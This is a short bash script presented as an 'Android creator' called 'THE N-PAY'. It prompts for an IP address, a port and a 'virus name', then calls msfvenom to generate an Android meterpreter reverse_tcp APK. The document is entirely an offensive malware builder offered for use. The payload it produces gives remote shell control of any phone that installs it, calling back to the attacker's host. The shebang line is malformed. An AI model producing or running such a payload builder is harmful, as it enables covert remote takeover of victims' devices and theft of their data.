#!bin/bash/
echo "THE N-PAY 
 VERSION 1.0 
 CREATED BY DISCORD/HEWALSAFAKKAC"

echo "-----------------------------------------------------------------------------------------------------"
    
    
    
    echo "Android creator"
 
read -p PRESS-ENTER...
clear

#virus olusma
   echo "Enter your ip adress:"
   read ip1
   echo "Please enter any port."
   read port1
   echo "Please enter your virus name."
   read virus1
   echo "The virus creating on:"
   pwd
   msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip1 LPORT=$port1 R > $virus1.apk 
  